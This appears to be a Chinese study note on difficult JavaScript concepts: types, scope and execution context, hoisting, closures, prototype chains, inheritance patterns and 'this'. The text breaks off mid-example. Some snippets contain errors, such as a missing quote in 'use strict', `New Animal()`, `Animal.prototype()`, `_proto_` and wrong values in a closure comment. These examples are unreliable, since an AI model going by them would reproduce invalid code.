# JS难点

## JS类型

### `js`数据类型

1. 表示空：`Undefined`，`Null`
2. 基础三大件：`Number`，`String`，`Boolean`
3. 两个新类型：`Symbol`，`BigInt`

> 关于Symbol

- Symbol 本质上是一种唯一标识符，**可用作对象的唯一属性名**，这样**其他人就不会改写或覆盖你设置的属性值**。 声明方法：

```
let id = Symbol("id“);
```

- Symbol 数据类型的特点是唯一性，即使是用同一个变量生成的值也不相等。

```
let id1 = Symbol('id');
 let id2 = Symbol('id');
 console.log(id1 == id2);  //false
```

- 另一特点是**隐藏性**，for···in，object.keys() 不能访问，但是也有能够访问的方法：**Object.getOwnPropertySymbols**
- 希望能够多次使用同一个symbol值的情况。为此，官方提供了全局注册并登记的方法：Symbol.for()

```
 let name1 = Symbol.for('name'); //检测到未创建后新建
 let name2 = Symbol.for('name'); //检测到已创建后返回
 console.log(name1 === name2); // true
```

> 关于BigInt

js 采用**双精度浮点数**，这也导致了精度有限的问题。在 js 中，Number 基本类型可以精确表示的最大整数是 2^53。因此早期会有这如下的“bug”：

```
let max = Number.MAX_SAFE_INTEGER;	// 最大安全整数

let max1 = max + 1
let max2 = max + 2

max1 === max2 //true
```

为了解决这个限制，BigInt出现在了ECMAScript标准中。

```
let max = BigInt(Number.MAX_SAFE_INTEGER);

let max1 = max + 1n
let max2 = max + 2n

max1 === max2 // false
```

#### 包装类型

在 JavaScript 中，基本类型是没有属性和方法的，但是为了便于操作基本类型的值，在调用基本类型的属性或方法时 JavaScript 会在后台隐式地将基本类型的值转换为对象，如：

```
const a = "abc";
a.length; // 3
a.toUpperCase(); // "ABC"
```

在访问`'abc'.length`时，JavaScript 将`'abc'`在后台转换成`String('abc')`，然后再访问其`length`属性。

JavaScript也可以使用`Object`函数显式地**将基本类型转换为包装类型**：

```
var a = 'abc'
Object(a) // String {"abc"}
```

也可以使用`valueOf`方法**将包装类型倒转成基本类型**：

```
var a = 'abc'
var b = Object(a)
var c = b.valueOf() // 'abc'
```

### `js`如何判断变量类型

#### `typeof`

**`typeof` 运算符 `typeof` 是一元运算符，返回结果是一个说明运算数类型的字符串。**如："number"，"string"，"boolean"，"object"，"function"，"undefined"（可用于判断变量是否存在）。 **但 `typeof` 的能力有限，其对于数组、对象、`Date`、`RegExp`类型返回的都是"object"。**如：

```
typeof {}; // "object" 
typeof []; // "object" 
typeof new Date(); // "object"
```

### 为什么typeof null是object

JS类型值是存在32位的单元里，其中有1-3位表示类型（TYPE TAG）  其他位表示真实值

Number类型由于双精度浮点数的限制2^53。表示object的标记位刚好是000

而js里面的null是空指针  机器码空指针标记也是0  所以最后出来的是object



#### **`instanceof` 运算符。**

`instanceof` 运算符要求其左边的运算数是一个对象，右边的运算数是对象类的名字或构造函数。如果 object 是 class 或构造函数的实例，则 `instanceof` 运算符返回 true。如果 object 不是指定类或函数的实例，或者 object 为 null，则返回 false。如：

```
[] instanceof Array; // true 
[] instanceof Object; // true 
[] instanceof RegExp; // false 
new Date instanceof Date; // true
```

所以，可以用`instanceof`运算符来判断对象是否为数组类型：

```
function isArray(arr){ 
  return arr instanceof Array; 
}
```

有两个限制：

- 不能检测字面声明的基本变量的类型，如： instanceof Number === false
- 由于 instanceof 会遍历原型链，所以只要是在原型链上的构造函数都会返回 true

#### `constructor` 属性

JavaScript中，每个对象都有一个`constructor`属性，它引用了初始化该对象的构造函数，常用于判断未知对象的类型。如给定一个求知的值通过`typeof`运算符来判断它是原始的值还是对象。如果是对象，就可以使用`constructor`属性来判断其类型。所以判断数组的函数也可以这样写：

```
function isArray(arr){ 
  return typeof arr == "object" && arr.constructor == Array; 
}
```

很多情况下，我们可以使用`instanceof`运算符或对象的`constructor`属性来检测对象是否为数组。例如很多JavaScript框架就是使用这两种方法来判断对象是否为数组类型。

**限制**：不能判断`null`和`undefined`，并且`constructor`是可以被覆盖的。

#### `Object.prototype.toString()`

```
Object.prototype.toString.call([]); // 返回 "[object Array]"` `Object.prototype.toString.call(/reg/ig); // 返回 "[object RegExp]"
```

这样，我们就可以写一个健壮的判断对象是否为数组的函数：

```
function isArray(arr){
  return Object.prototype.toString.call(arr) === "[object Array]";
}
```

### 基本类型的性质

#### null 和 undefined 的区别

**null：**

Null用来表示**尚未存在的对象**，常用来表示函数企图返回一个不存在的对象

- 作为函数的参数，表示该函数的参数不是对象
- 作为对象原型链的终点

**undefined：**

undefined表示”**缺少值**”,就是此处应该有一个值,但是还没有定义。

- 变量被声明了，但没有赋值时，就等于undefined
- 调用函数时，应该提供的参数没有提供，该参数等于undefined
- 对象没有赋值属性，该属性的值为undefined
- 函数没有返回值时，默认返回undefined

**类型转化的区别：**

null是一个表示”无”的对象，转为数值是为0，undefined是一个表示”无”的原始值，转为数值时为NaN。当声明的变量还未被初始化时，变量的默认值为**undefined**。

## 作用域和执行上下文

JavaScript代码的整个执行过程，分为两个阶段，**代码编译阶段**与**代码执行阶段**。

- 编译阶段：由**编译器**完成，将代码翻译成可执行代码。这个阶段**作用域规则**会确定。
- 执行阶段：由**引擎**完成，主要任务是执行可执行代码。**执行上下文**在这个阶段创建。

注意区分作用域规则和执行上下文的区别。

### 作用域

简单来说作用域就是**一个区域，没有变量**（定义 ）。作用域**可以嵌套**（特点）。作用域规定了如何查找变量，也就是确定当前执行代码**对变量的访问权限**（功能）。作用域**在函数定义时就已经确定了**，不是在函数调用确定（确定时间）。

**ES6 之前 JavaScript 只有全局作用域和函数作用域**。ES6 后，增加了**块级作用域**（最近大括号的作用范围）, 通过`let` 和` const` 声明的变量。

作用域其实由两部分组成：

1. 记录**作用域内变量信息**（假设变量，常量，函数等统称为变量）和**代码结构信息**的东西，称之为 `Environment Record`。
2. 一个引用 `__outer__`，这个引用**指向当前作用域的父作用域**。全局作用域的 `__outer__` 为 null。

### 词法作用域

JavaScript 采用**词法作用域**(lexical scoping)，也就是**静态作用域**。

词法作用域是 JavaScript 从**标识符**到**变量**的映射机制，也就是说，它主管着 JavaScript 引擎在遇到一个标识符时，根据这个标识符在当前作用域中查找对应的变量的机制。

就是**代码在编写过程中体现出来的作用范围**，代码一旦写好了，没有运行之前（不用执行），作用范围就已经确定好了，这个就是所谓的词法作用域。

**特点**：

- 函数允许访问函数外部的数据
- 整个代码结构中只有**函数**才能限定作用域
- **作用规则**首先使用**变量提升**的规则分析
- 如果当前作用规则中有该名字，则不考虑外部作用域的名字

```
var a = 1;
function out() {
  var a = 2;
  inner();
}

function inner() {
  console.log(a)
}
out();  //====>  1
```

#### 修改词法作用域

> 一般不是真的希望你在写代码的时候去改变作用域规则（这样做往往需要付出性能的代价），而是在摸底，想知道你对词法作用域到底了解到了什么程度。

**`eval` 对作用域的修改**

```
function showName(str) {
  eval(str)
  console.log(name)
}

var name = 'xiuyan'
var str = 'var name = "BigBear"'

showName(str) // 输出 BigBear
```

大家知道，`eval` 函数的入参是一个字符串。当 `eval` 拿到一个字符串入参后，它会把这段字符串的内容当做一段 js 代码（不管它是不是一段 js 代码），插入自己被调用的那个位置。所以上面这个例子里，被 `eval` “改造” 过后的 `showName` 函数其实长这样了：

```
function showName(str) {
  var name = 'BigBear'
  console.log(name)
}
```

而这个改变确实只有在` eval (str)` 这行代码被执行后才发生 ——`eval `在运行时改变了作用域的内容，它成功地 “修改” 了词法作用域规则约束下在书写阶段就划分好的作用域。

**`with` 对作用域的修改**

它的作用就是帮我们 “偷懒”，当我们不想重复地写一个对象名作为前缀的时候，with 可以帮到我们：

```
var me = {
  name: 'xiuyan',
  career: 'coder',
  hobbies: ['coding', 'footbal']
}

// 假如我们想输出对象 me 中的变量，没有 with 可能会这样做：
console.log(me.name)
console.log(me.career)
console.log(me.hobbies)

// 但 with 可以帮我们省去写前缀的时间
with(me) {
  console.log(name)
  console.log(career)
  console.log(hobbies)
}
```

[为什么说 with 可以 “改变” 词法作用域呢？](https://www.imooc.com/read/70/article/1613)

### 作用域链

当查找变量的时候，会先从当前上下文的**变量对象**中查找，如果没有找到，就会从父级(**词法层面**上的父级)执行上下文的**变量对象**中查找，一直找到全局上下文的变量对象，也就是全局对象。这样**由多个执行上下文的变量对象构成的指针链表就叫做作用域链**。

**作用域链本质**上是一个指向当前环境与上层环境的一系列**变量对象**的**指针列表**（它只引用但不实际包含变量对象），作用域链保证了**当前执行环境对符合访问权限的变量和函数的有序访问**。

**例子：** 用一个数组`scopeChain`来表示作用域链，数组的第一项`scopeChain[0]`为作用域链的最前端，而数组的最后一项，为作用域链的最末端，所有的最末端都为全局变量对象。

```
var a = 1;             
function out() {
    var b = 2;
    function inner() {
        var c = 3;
        console.log(a + b + c);
    }
    inner();          
}
out();
```

首先，代码开始运行时就创建了**全局上下文环境**，接着运行到`out()`时创建 **`out`函数的执行上下文**，最后运行到`inner()`时创建 **`inner`函数的执行上下文**，我们设定他们的变量对象分别为`VO(global)`，`VO(out)`, `VO(inner)`。

当函数创建时，执行上下文为：

```
// 全局上下文环境
globalEC = {
  VO: {
    out: <out reference>,  // 表示 out 的地址引用
    a: undefined
  },
  scopeChain: [VO(global)], // 作用域链
}

// out 函数的执行上下文
outEC = {
  VO: {
    arguments: {...},
    inner: <inner reference>,  // 表示 inner 的地址引用
    b: undefined
  },
  scopeChain: [VO(out), VO(global)], // 作用域链
}

// inner 函数的执行上下文
innerEC = {
  VO: {
    arguments: {...},  
    c: undefined,
  }, 
  scopeChain: [VO(inner), VO(out), VO(global)], // 作用域链
}
```

### 执行上下文

在代码执行阶段，执行到一个函数的时候，就会进行一些准备工作，这些准备工作就是**执行上下文**

执行上下文可以从**分类**、**组成**和**生命周期**等具体的维度去理解。

#### **执行上下文的分类**

- **全局上下文** —— 全局代码所处的环境，不在函数中的代码都在全局执行上下文中
- **函数上下文** —— 在函数调用时创建的上下文
- **Eval 执行上下文** —— 运行 Eval 函数中的代码时所创建的环境（我不用）

#### **执行上下文的生命周期**

当调用一个函数时，一个新的执行上下文就会被创建。而一个执行上下文的生命周期可以分为两个阶段：

- **创建阶段**：在这个阶段，执行上下文会分别**创建变量对象**，**建立作用域链**，以及**确定this的指向**。
- **代码执行阶段**：开始执行代码，会完成**变量赋值**，**函数引用**，以及**执行其他代码**。

![image-20210426112015426](https://gitee.com/lu_jianping/the-front-end-knowledge/raw/master/JS%E9%9A%BE%E7%82%B9.assets/image-20210426112015426.png)

#### 全局和函数的执行上下文组成

##### 全局执行上下文

- 全局上下文的组成：

  当我们的脚本里一行代码也没有的时候里，全局上下文里会比较干净，只有两个东西：

  - 全局对象（浏览器里是 Window, Node 环境下是 Global）
  - this 变量。这里的 this ，指向的还是全局变量

  但只要你往里面写了点东西，这个世界就会热闹起来了，比如你要敢随手写这么几句：

  ```
  var name = 'xiuyan'
  var tel = '123456'
  
  function getMe() {
      return {
          name: name,
          tel: tel
      }
  }
  ```

  全局上下文的组成就会立刻丰富成下面这个样子：

  ![图片描述](https://img1.sycdn.imooc.com/5e72dbfe000134e511941030.png)

**创建阶段的工作：**

- 创建全局对象（Window 有了）
- 创建 this ，并让它指向全局对象
- 给变量和函数安排内存空间
- 默认给变量赋值为 undefined；将函数声明放入内存
- 创建作用域链

##### 变量提升的本质

实际上根本不存在任何的 “提升”，变量一直在原地。所谓的 “提升”，**只是变量的创建过程（在上下文创建阶段完成）和真实赋值过程（在上下文执行阶段完成）的不同步带来的一种错觉**。执行上下文在不同阶段完成的不同工作，才是 “变量提升 “的本质。

##### **函数执行上下文**

它在机制层面和全局上下文高度一致，只需要关注它与全局上下文之间的不同即可。**两者之间的不同主要体现在以下方面上**：

- 创建的**时机** —— 全局上下文在进入脚本之初就被创建，而函数上下文则是在函数调用时被创建
- 创建的**频率** —— 全局上下文仅在代码刚开始被解释的时候创建一次；而函数上下文由脚本里函数调用的多少决定，理论上可以创建无数次
- 创建阶段的**工作内容不完全相同** —— 函数上下文不会创建全局对象（Window），而是**创建变量对象**（arguments）；创建出的 **this** 不再死死指向全局对象，而是**取决于该函数是如何被调用的** —— 如果它被一个引用对象调用，那么 this 就指向这个对象；否则，this 的值会被设置为全局对象或者 undefined（在严格模式下）

一个简单的例子来看看函数上下文在不同阶段的表现:

```
var name = 'xiuyan'
var tel = '123456'

function getMe() {
    return {
        name: name,
        tel: tel
    }
}

// 增加了函数调用
getMe()
```

当引擎执行到 getMe () 调用这一行时，首先会进入函数上下文的创建阶段，在这个阶段里，函数上下文的内容如下：

![图片描述](https://img1.sycdn.imooc.com/5e72dc270001644d10540614.png)

#### 调用栈

因为函数上下文可以有许多个，我们不可能保留所有的上下文。当一个函数执行完毕，其对应的上下文必须让出之前所占用的资源。因此上下文的建立和销毁，就对应了一个” 入栈 “和” 出栈 “的操作。**当我们调用一个函数的时候，就会把它的上下文推入调用栈里，执行完毕后出栈，随后再为新的函数进行入栈操作。**

```
function testA() {
  console.log('执行第一个测试函数的逻辑');
  testB();
  console.log('再次执行第一个测试函数的逻辑');
}

function testB() {
  console.log('执行第二个测试函数的逻辑');
}

testA();
```

在这整个过程里，调用栈的变化示意如下：

![image-20210427114237574](https://gitee.com/lu_jianping/the-front-end-knowledge/raw/master/JS%E9%9A%BE%E7%82%B9.assets/image-20210427114237574.png)

##### 理解作用域的本质

作用域其实就是**当前所处的执行上下文**。我们基于执行上下文，来理解一下作用域的特征：

以上面代码的 testB 为例，我们看到，最初处于外部作用域（testA、全局上下文）时，testB 对应的上下文还没有被推入调用栈；而当 testB 执行结束、代码执行退回到外部作用域时，testB 早已从栈顶弹出。这意味着，每次位于外部作用域时，testB 的执行上下文都压根不存在于调用栈内。此时就算 testA 函数上下文和全局上下文无论如何也找不到任何关于 testB 的线索，自然访问不到它内部的变量啦！

#### 自由变量的查找规则

自由变量的查找是基于**作用域链与上下文变量的结合**。

**闭包的查询：**

在执行上下文的创建阶段，跟着被创建的还有**作用域链**！这个作用域链在函数中以内部属性的形式存在，在函数定义时，其对应的父变量对象就会被记录到这个内部属性里。闭包正是通过这一层作用域链的关系，实现了对父作用域执行上下文信息的保留。

**外部作用域的变量的查询：**

```
function testA() {
  console.log('执行第一个测试函数的逻辑');
  testB();
  console.log('再次执行第一个测试函数的逻辑');
}

function testB() {
  console.log('执行第二个测试函数的逻辑');
}

testA();
```

在执行阶段，在函数作用域内部找不到 name 这个变量，那么引擎会沿着**作用域链**向上找、定位到它对应的父级作用域的上下文、看有没有目标变量，如果还没有，那么就沿着作用域链继续往上定位、直到找到为止。

**注意**！这里是沿着作用域链找，可**不是沿着调用栈**一层一层往上找哦！调用栈是在执行的过程中形成的，而作用域链可是在书写阶段就决定了。因此，testB 里找不到的变量，绝不会去 testA 里找，而是去全局上下文变量里找！

### 变量对象

> **变量对象的创建过程**

1. 建立`arguments`对象。检查当前上下文中的参数，**建立该对象下的属性与属性值**。
2. **检查当前上下文的函数声明**，也就是使用`function`关键字声明的函数。在变量对象中**以函数名建立一个属性，属性值为指向该函数所在内存地址的引用**。如果函数名的属性已经存在，那么该属性将会被新的引用所**覆盖**。
3. 检查当前上下文中的**变量声明**，**每找到一个变量声明，就在变量对象中以变量名建立一个属性**，属性值为`undefined`**。\**如果该变量名的属性\**已经存在**，为了防止同名的函数被修改为`undefined`，则会**直接跳过**，原属性值不会被修改。

**活动对象**

变量对象与活动对象其实都是同一个对象，只是处于执行上下文的不同生命周期。不过只有处于函数调用栈栈顶的执行上下文中的变量对象，才会变成活动对象。

### **作用域与执行上下文区别**

作用域只是一个“地盘”，其中没有变量。**变量是通过作用域对应的执行上下文环境中的变量对象来实现的**。所以**作用域是静态观念**的，而**执行上下文环境是动态上**的。有闭包存在时，一个作用域存在两个上下文环境也是有的。

同一个作用域下，**对同一个函数的不同的调用会产生不同的执行上下文环境**，继而产生不同的变量的值，**所以，作用域中变量的值是在执行过程中确定的，而作用域是在函数创建时就确定的。**

**如果要查找一个作用域下某个变量的值，就需要找到这个作用域对应的执行上下文环境，再在其中找到变量的值。**

## 变量提升

在JavaScript中，**函数及变量的声明**都将被提升到**函数的最顶部**，提升的仅仅是变量的声明，变量的赋值并不会被提升。函数的声明与变量的声明是不一样的，**函数表达式和变量表达式只是其声明被提升，函数声明是函数的声明和实现都被提升。**

**原理**

与JS的编译过程有关

> 事实上，JS也是有编译阶段的，它和传统语言的区别在于，JS不会早早地把编译工作做完，而是**一边编译一边执行**。简单来说，所有的JS代码片段在执行之前都会被编译，只是这个编译的过程非常短暂（可能就只有几微妙、或者更短的时间），紧接着这段代码就会被执行。

在这个短暂的**编译阶段**里，JS 引擎会搜集所有的变量声明，并且提前让声明生效。至于剩下的语句，则需要等到执行阶段、等到执行到具体的某一句的时候才会生效。这就是变量提升背后的机制。

### **let 和 const 的变量提升禁用问题**

```
console.log(a); // Uncaught ReferenceError: a is not defined
let a = "I am a";

let b = "I am outside B";
if(true){
    console.log(b); // Uncaught ReferenceError: b is not defined
    let b = " I am inside B";
}
```

如果b没有变量提升，执行到console.log时应该是输出全局作用域中的b，而不是出现错误。

我们可以推知，这里**确实出现了变量提升**，而我们不能够访问的原因事实上是因为**let的死区设计**：当前作用域顶部到该变量声明位置中间的部分，都是该let变量的死区，在死区中，禁止访问该变量。由此，我们给出结论，**let声明的变量存在变量提升， 但是由于死区我们无法在声明前访问这个变量**。

> 这是因为 ES6 中有明确的规定：如果区块中存在 let 和 const 命令，这个区块对这些命令声明的变量，从一开始就形成了封闭作用域。假如我们尝试在声明前去使用这类变量，就会报错。

> 暂时性死区的本质：当我们进入当前作用域时，let 或者 const 声明的变量已经存在了——它们只是不允许被获取而已。要想获取它们，必须得等到代码执行到声明处。

### let 和 var的区别

1. var声明的变量，只有函数才能为它创建新的作用域； let声明的变量，支持**块级作用域**，花括号就能为它创建新的作用域；
2. 相同作用域，var可以**反复声明相同标识符的变量**，而let是不允许的;
3. let声明的变量**禁止在声明前访问**

### const 和 let 的区别

- const 声明的变量，必须在声明同时被初始化，否则会报错。
- const 声明的变量，在赋值过后，值不可以再被更改。
- 引用类型的属性值（包括数组的元素）可以被更改，只要你不修改引用的指向。

## 闭包相关

### 定义

闭包就是指**有权访问另一个函数作用域中的变量的函数**。

**通俗解释：\**闭包的关键在于：外部函数调用之后其变量对象本应该被销毁，但\**闭包的存在**使我们仍然可以访问**外部函数的变量对象**。

### 作用域链

当某个函数被掉用的时候，会创建一个**执行环境及相应的作用域链**。然后使用arguments和其他命名参数的值来初始化函数的活动对象。但在作用域链中，外部函数的活动对象始终处于第二位，外部函数的外部函数的活动对象处于第三位...直至作为作用域链终点的全局执行环境。

*作用域链本质上是一个**指向变量对象的指针列表**，他只引用但不实际包含变量对象。*

### 闭包的生命周期

```
function add(x) {
  function closure(y) {
     return x + y;
  }
  return closure;
}

let add2 = add(2);
let add5 = add(5);
// add2 和 add5 共享相同的函数定义，但是保存了不同的环境
// 在add2的环境中，x为5。而在add5中，x则为10
console.log(add2(3)); // 5
console.log(add5(10)); // 15

// 释放闭包的引用
add2 = null;
add5 = null;
```

通常，函数的作用域及其所有变量都会在函数执行结束后被销毁。但是，在**创建了一个闭包以后，这个函数的作用域就会一直保存到闭包不存在为止**。

当闭包中的函数`closure`从`add`中返回后，它的**作用域链被初始化为包含`add`函数的活动对象和全局变量对象**。这样`closure`就可以访问在`add`中定义的所有变量。

更重要的是，`add`函数在执行完毕后，也不会销毁，**因为`closure`函数的作用域链仍然在引用这个活动对象**。

换句话说，当`add`返回后，其执行环境的作用域链被销毁，但它的活动对象仍然在内存中，直至`closure`被销毁。

### 使用注意点

1）由于闭包会让包含函数中的变量都被保存在内存中，**内存消耗很大**，所以不能滥用闭包，否则会造成网页的性能问题，在IE中可能导致内存泄露。解决方法是，**在退出函数之前，将不使用的局部变量全部删除**。

2）**闭包会在父函数外部，改变父函数内部变量的值**。所以，如果你把父函数当作对象（object）使用，把闭包当作它的公用方法（Public Method），把内部变量当作它的私有属性（private value），这时一定要小心，不要随便改变父函数内部变量的值。

### 闭包的应用

1. **模拟私有变量的实现**

**私有变量**：希望某些变量受保护，让它仅**在对象内部能访问到，无法从外部触及**，这样的变量就是私有变量。

- 那么在 JS 中，既然无法通过 private 这样的关键字直接在类里声明变量的私有性，我们就只能另寻它法。这时候就轮到闭包登场了

```
// 利用闭包生成IIFE，返回 User 类
const User = (function() {
    // 定义私有变量_password
    let _password

    class User {
        constructor (username, password) {
            // 初始化私有变量_password
            _password = password
            this.username = username
        }

       login() {
           // 这里我们增加一行 console，为了验证 login 里仍可以顺利拿到密码
           console.log(this.username, _password)
           // 使用 fetch 进行登录请求，同上，此处省略
       }
    }

    return User
})()

let user = new User('xiuyan', 'xiuyan123')

console.log(user.username)
console.log(user.password)
console.log(user._password)
user.login()
```

1. 偏函数与柯里化

**柯里化**:

> 把**接受 n 个参数的 1 个函数**改造为**只接受 1个参数的 n 个互相嵌套的函数**的过程。也就是 `fn (a, b, c)`会变成 `fn (a)(b)(c)`

```
function generateName(prefix) {  
    return function(type) {
        return function (itemName) {
            return prefix + type + itemName
        }    
    }
}

// 生成大卖网商品名专属函数
var salesName = generateName('大卖网')

// “记住”prefix，生成大卖网母婴商品名专属函数
var salesBabyName = salesName('母婴')

// "记住“prefix和type，生成洗菜网生鲜商品名专属函数
var vegFreshName = generateName('洗菜网')('生鲜')

// 输出 '大卖网母婴奶瓶'
salesBabyName('奶瓶')
// 输出 '洗菜网生鲜菠菜'
vegFreshName('菠菜')

// 啥也不记，直接生成一个商品名
var itemFullName = generateName('洗菜网')('生鲜')('菠菜')
```

**偏函数**：

> 偏函数是说，固定你函数的某一个或几个参数，然后返回一个新的函数（这个函数用于接收剩下的参数）。你有 10 个入参，你可以只固定 2 个入参，然后返回一个需要 8 个入参的函数 —— 偏函数应用是不强调 “单参数” 这个概念的。它的目标仅仅是把函数的入参拆解为两部分。

```
function generateName(prefix) {
    return function(type, itemName) {
        return prefix + type + itemName
    }
}

// 把3个参数分两部分传入
var itemFullName = generateName('大卖网')('母婴', '奶瓶')
```

1. 模仿块级作用域
2. 模块模式

## 原型和原型链

### 构造函数

- 目的： 创建一个自定义的类，并利用这个类创建相应的实例
- 习惯上构造函数大写
- 通过new关键字来调用

```
function Person(name, age, gender) {
    this.name = name
    this.age = age
    this.gender = gender
    this.sayName = function () {
        alert(this.name);
    }
}
var per = new Person("孙悟空", 18, "男");
function Dog(name, age, gender) {
    this.name = name
    this.age = age
    this.gender = gender
}
var dog = new Dog("旺财", 4, "雄")
console.log(per);//当我们直接在页面中打印一个对象时，事件上是输出的对象的toString()方法的返回值
console.log(dog);
```

### 原型

- 利用Person构造函数每创建一个实例的时候，都会对每个实例对象创建一个新的功能相同的`sayName`方法，**耗费内存**。
- 基于上述的现象，是否可以将功能相同的方法单独放在一个地方，让所有实例都可以共同访问到呢，这就需要用到原型`prototype`。
- **JavaScript中，每定义一个函数数据类型（普通函数、类）时，都会自带一个`prototype`属性，这个属性指向该函数的原型对象。**
- 我们可以将所有实例对象的公共内容设置在原型对象中。
- 原型对象有两个属性，`constructor` 和 `__proto__`。

### 原型链

- ```
  __proto__
  ```

  和

  ```
  constructor
  ```

  - 每个实例对象会自带一个属性`__proto__`，这个属性指向当前实例所属的原型
  - 原型对象会自带一个属性`constructor`，它指向函数对象

```
function Person() {}
var person = new Person()
console.log(person.__proto__===Person.prototype)//true
console.log(Person.prototype.constructor===Person)//true
//顺便学习一个ES5的方法,可以获得对象的原型
console.log(Object.getPrototypeOf(person) === Person.prototype) // true
```

![image-20200922214545482]()

- JavaScript的对象继承是通过原型链来实现的，通过`prototype`对象来指向父类对象，直到指到`Object`对象为止，所构成的一条原型指向的链条成为`原型链`

- **当我们访问对象的一个属性或方法时，它会先在对象自身中寻找，如果有则直接使用，如果没有则会去原型对象中寻找，如果找到则直接使用。如果没有则去原型的原型中寻找,直到找到Object对象的原型，Object对象的原型没有原型，如果在Object原型中依然没有找到，则返回undefined。**

- ```
  hasOwnProperty
  ```

  和

  ```
  in
  ```

  - `hasOwnProperty`检查对象自身中是否含有该属性
  - `in`检查对象自身或者其原型链上的原型对象是否有该属性

- 当读取实例的属性时，如果找不到，就会查找与对象关联的原型中的属性，如果还查不到，就去找原型的原型，一直找到最顶层Object为止。**Object是JS中所有对象数据类型的基类(最顶层的类)在`Object.prototype`上没有`__proto__`这个属性。**

![image-20200922215335529]()

**注意**： 几乎所有 JavaScript 中的对象都是位于原型链顶端的 Object 的实例，除了 `Object.prototype`（当然，如果我们手动用 `Object.create(null)` **创建一个没有任何原型的对象**，那它也不是 Object 的实例）。

## 继承的实现

### new创建实例对象的步骤

1. 创建一个新对象
2. 将新对象的`__proto__`指向构造函数的`prototype`对象
3. 将构造函数的作用域复制给新对象（this指向新对象）
4. 执行构造函数中的代码
5. 返回新对象。如果该函数没有返回对象，则返回this

```
// 1. 创建一个新对象
var Obj = {};
// 2. 将新对象的_proto_指向构造函数的prototype对象
Obj._proto_ =  Animal.prototype();
// 3. 执行构造函数中的代码（为这个新对象添加属性） 
Animal.call(Obj);
// 4. 返回新的对象
return Obj；
```

### 原型链继承

**核心**：将父类的实例作为子类的原型来实现继承

```
function Dog(age) {
  this.age = age;
}
Dog.prototype = New Animal();
Dog.prototype.name = 'dog';

const dog = new Dog(12);
console.log(dog.name);
console.log(dog.eat('age'));
console.log(dog instanceof Animal); //true 
console.log(dog instanceof Dog); //true
```

**特点：** 1.实例可继承的属性有：**实例的构造函数的属性，父类构造函数属性，父类原型的属性** 2.非常纯粹的继承关系，实例是子类的实例，也是父类的实例 3.**父类新增原型方法/原型属性，子类都能访问到**

**缺点：** 1.新实例无法向父类构造函数传参。 2.继承单一。 3.**所有新实例都会共享父类实例的属性**。（原型上的属性是共享的，一个实例修改了原型属性，另一个实例的原型属性也会被修改！） 4.要想为子类**新增原型上的属性和方法**，必须要在`new Animal()`这样的语句之后执行，**不能放到构造器中**

### **构造函数继承**

**核心**：使用父类的构造函数来增强子类的实例，相当于是复制父类的实例属性给子类（**没有用到原型链**）

```
function Dog(name) {
  Animal.apply(this, 'dog');
  this.name = name;
}

const dog = new Dog();
console.log(dog.name);
console.log(dog.eat('age'));
console.log(dog instanceof Animal); //false 
console.log(dog instanceof Dog); //true
```

**重点**：调用了.call()和.apply()方法来将父类构造函数引入子类（在子类函数中做了父类函数的自执行（复制））

**特点：** 1.只继承了父类构造函数的属性，**没有继承父类原型的属性**。 2.解决了原型链继承缺点1、2、3。 3.可以实现**多继承**，继承多个构造函数属性（call多个）。 4.在子实例中可向父实例传参。

**缺点：** 1.能继承父类构造函数的属性。 2.无法实现构造函数的复用。（每次用每次都要重新调用） 3.**每个新实例都有父类构造函数的副本**，**臃肿**。 4.**实例并不是父类的实例**，只是子类的实例

### **组合继承（原型链继承和构造函数继承）（常用）**

**核心**：通过**调用父类构造函数实现继承父类的属性**并**保留了向父类构造函数传参的优点**，然后通过**将父类的实例作为子类的原型**来**实现函数的复用**

```
function Cat(name){
  Animal.call(this, name);
  this.name = name;
}
Cat.prototype = new Animal();
// 原型的constructor属性指回构造函数
Cat.prototype.constructor = Cat;

var cat = new Cat();
console.log(cat.name);
console.log(cat.sleep());
console.log(cat instanceof Animal); // true
console.log(cat instanceof Cat); // true
```

**重点：**结合了两种模式的优点，**传参和复用**

**特点：** 1.可以继承父类原型上的属性，可以传参，可复用。 2.每个**新实例引入的构造函数属性是私有的**。 3.既是子类的实例，也是父类的实例

**缺点：** **调用了两次（call一次，new一次）父类构造函数**（耗内存），**子类的构造函数会代替原型上的那个父类构造函数**。

### 原型式继承

![image-20210324135745065](https://gitee.com/lu_jianping/the-front-end-knowledge/raw/master/JS%E9%9A%BE%E7%82%B9.assets/image-20210324135745065.png)

**重点：**用一个函数包装一个对象，然后返回这个函数的调用，这个函数就变成了个可以随意增添属性的实例或对象。`object.create()`就是这个原理。

**特点：** **类似于复制一个对象**，用函数来包装。

**缺点：** 1.**所有实例都会继承原型上的属性**。 2.**无法实现复用**。（新实例属性都是后面添加的）

### **寄生式继承**

![image-20210324140254587](https://gitee.com/lu_jianping/the-front-end-knowledge/raw/master/JS%E9%9A%BE%E7%82%B9.assets/image-20210324140254587.png)

**重点：**就是给原型式继承外面套了个壳子。 **优点：\**没有创建自定义类型，因为只是套了个壳子\**返回对象**（这个），这个函数顺理成章就成了创建的新对象。 **缺点：**没用到原型，无法复用。

### **寄生组合式继承（常用）**

**寄生**：在函数内返回对象然后调用 **组合**： 1、函数的原型等于另一个实例。 2、在函数中用apply或者call引入另一个构造函数，可传参。

```
function Cat(name){
  Animal.call(this);
  this.name = name || 'Tom';
}
// 修复子类的构造函数会代替原型上的那个父类构造函数的问题
(function(){
  // 创建一个没有实例方法的类
  var Super = function(){};
  Super.prototype = Animal.prototype;
  //将实例作为子类的原型
  Cat.prototype = new Super();
})();

var cat = new Cat();
Cat.prototype.constructor = Cat; // 需要修复下构造函数
console.log(cat.name);
console.log(cat.sleep());
console.log(cat instanceof Animal); // true
console.log(cat instanceof Cat); //true
```

重点：修复了组合继承的问题。

## this指向问题

**`this` 就是一个指针，指向我们调用函数的对象。** **执行上下文**: 是语言规范中的一个概念，用通俗的话讲，大致等同于函数的执行“环境”。具体的有：变量作用域（和 *作用域链条*，闭包里面来自外部作用域的变量），函数参数，以及 `this` 对象的值。

### **找出 this 的指向**

`this` 的值并不是由函数定义放在哪个对象里面决定，而是函数执行时由谁来唤起决定。

> 一般函数指向问题

- 全局定义的函数的this指向window
- 严格模式下，函数内部的this指向是undefined

```
// function test(){ 
// this.a = 1; //window.a ->全局var a = 1
// console.log(this);
// console.log(this.a);
// }
var a = 1;
function test() {
    use strict';
    console.Log(this);
    console.log(this.a);
}
test();
```

> 对象内部的this指向问题（构造函数里的this）

- 对象内部的this指向该实例对象本身 （构造函数里面的this会绑定到我们new出来的这个对象上）
- 原型上的方法内部的this指向依然指向该实例对象本身

```
var a = 2;
var obj = {
    a: 1,
    test: function(){ 
